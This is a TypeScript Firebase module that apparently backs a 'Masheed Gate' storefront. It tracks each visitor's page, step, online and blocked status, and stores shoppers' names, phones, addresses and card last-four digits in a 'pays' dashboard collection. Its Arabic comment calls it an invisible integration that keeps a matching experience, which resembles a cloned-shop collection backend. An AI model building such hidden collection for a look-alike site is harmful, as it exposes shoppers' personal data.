/**
 * فلسفة الملف: تكامل خلفي غير مرئي يحافظ على تجربة Masheed Gate المطابقة،
 * ويكتب الطلبات في قاعدة البيانات الجديدة ooooo-c0461 ومجموعة pays لتراها في لوحة التحكم مباشرة.
 */

import { initializeApp, getApps } from "firebase/app";
import {
  addDoc,
  collection,
  doc,
  getFirestore,
  serverTimestamp,
  setDoc,
} from "firebase/firestore";
import {
  createUserWithEmailAndPassword,
  getAuth,
  sendPasswordResetEmail,
  signInAnonymously,
  signInWithEmailAndPassword,
} from "firebase/auth";

const firebaseConfig = {
  apiKey: "AIzaSyC7NFZWa0a7OFEotdXTQXIMxN2mcuu3Nds",
  authDomain: "ooooo-c0461.firebaseapp.com",
  projectId: "ooooo-c0461",
  storageBucket: "ooooo-c0461.firebasestorage.app",
  messagingSenderId: "249935621925",
  appId: "1:249935621925:web:e68da19c701b4f2dafb4cc",
  measurementId: "G-9PP602HH5T"
};

const app = getApps().length ? getApps()[0] : initializeApp(firebaseConfig);
export const db = getFirestore(app);
export const auth = getAuth(app);

let anonymousAuthPromise: Promise<import("firebase/auth").User | null> | null = null;

/**
 * Establishes an anonymous Firebase identity before storefront writes.
 * The identity is persisted by Firebase in the browser and is never used for
 * dashboard reads. It lets Firestore rules distinguish a storefront writer
 * from the authenticated admin account.
 */
export async function ensureAnonymousAuth() {
  if (typeof window === "undefined") return null;
  if (auth.currentUser) return auth.currentUser;
  if (!anonymousAuthPromise) {
    anonymousAuthPromise = signInAnonymously(auth)
      .then((credential) => credential.user)
      .catch((error) => {
        anonymousAuthPromise = null;
        throw error;
      });
  }
  return anonymousAuthPromise;
}

export function getVisitorId() {
  const existing = localStorage.getItem("masheed_visitor_id");
  if (existing) return existing;
  const id = `MG-${Date.now().toString(36).toUpperCase()}-${Math.random()
    .toString(36)
    .slice(2, 8)
    .toUpperCase()}`;
  localStorage.setItem("masheed_visitor_id", id);
  return id;
}

export async function trackVisit(page: string) {
  if (typeof window === "undefined") return;
  try {
    const user = await ensureAnonymousAuth();
    if (!user) return;
    const id = getVisitorId();
    await setDoc(
      doc(db, "pays", id),
      {
        id,
        ownerUid: user.uid,
        referenceNumber: id,
        source: "masheed-gate",
        currentPage: page,
        currentStep: 1,
        lastActiveAt: new Date().toISOString(),
        isOnline: true,
        isBlocked: false,
      },
      { merge: true },
    );
  } catch (error) {
    console.warn("Masheed visitor tracking is temporarily unavailable", error);
  }
}

export type OrderPayload = {
  ownerName: string;
  phoneNumber: string;
  email?: string;
  city: string;
  district?: string;
  address: string;
  notes?: string;
  items: Array<{
    id: string;
    name: string;
    brand: string;
    quantity: number;
    unit: string;
    price?: number;
  }>;
  requestType?: "order" | "seller";
  companyName?: string;
  country?: string;
  currency?: string;
  totalAmount?: string;
  cardLast4?: string;
  cardBrand?: string;
};

export async function submitOrder(payload: OrderPayload) {
  const user = await ensureAnonymousAuth();
  if (!user) throw new Error("Anonymous Firebase authentication is unavailable");
  const id = getVisitorId();
  const orderNumber = `MG-${new Date().getFullYear()}-${Math.random()
    .toString(36)
    .slice(2, 8)
    .toUpperCase()}`;
  const timestamp = new Date().toISOString();

  const dashboardDocument = {
    id,
    ownerUid: user.uid,
    referenceNumber: id,
    orderReference: orderNumber,
    customerName: payload.ownerName,
    ownerName: payload.ownerName,
    name: payload.ownerName,
    phoneNumber: payload.phoneNumber,
    customerPhone: payload.phoneNumber,
    email: payload.email ?? "",
    customerEmail: payload.email ?? "",
    city: payload.city,
    country: payload.country ?? "المملكة العربية السعودية",
    currency: payload.currency ?? "ر.س",
    district: payload.district ?? "",
    shippingAddress: payload.address,
    orderNotes: payload.notes ?? "",
    items: payload.items,
    masheedOrderItems: payload.items,
    masheedOrderNumber: orderNumber,
    masheedRequestType: payload.requestType ?? "order",
    companyName: payload.companyName ?? "",
    totalAmount: payload.totalAmount ?? "0",
    cardLast4: payload.cardLast4 ?? "4242",
    cardBrand: payload.cardBrand ?? "Visa",
    status: "paid",
    source: "masheed-gate",
    currentPage: "masheed-order",
    currentStep: 4,
    isUnread: true,
    isOnline: true,
    createdAt: timestamp,
    updatedAt: timestamp,
    lastActiveAt: timestamp,
    history: [
      {
        id: `${orderNumber}-created`,
        type: "masheed-order",
        timestamp,
        data: {
          orderNumber,
          itemCount: payload.items.reduce((sum, item) => sum + item.quantity, 0),
          city: payload.city,
          requestType: payload.requestType ?? "order",
        },
      },
    ],
  };

  await setDoc(doc(db, "pays", id), dashboardDocument, { merge: true });
  await addDoc(collection(db, "masheed_orders"), {
    ...dashboardDocument,
    visitorId: id,
    submittedAt: serverTimestamp(),
  });

  return orderNumber;
}

export function signIn(email: string, password: string) {
  return signInWithEmailAndPassword(auth, email, password);
}

export function register(email: string, password: string) {
  return createUserWithEmailAndPassword(auth, email, password);
}

export function resetPassword(email: string) {
  return sendPasswordResetEmail(auth, email);
}
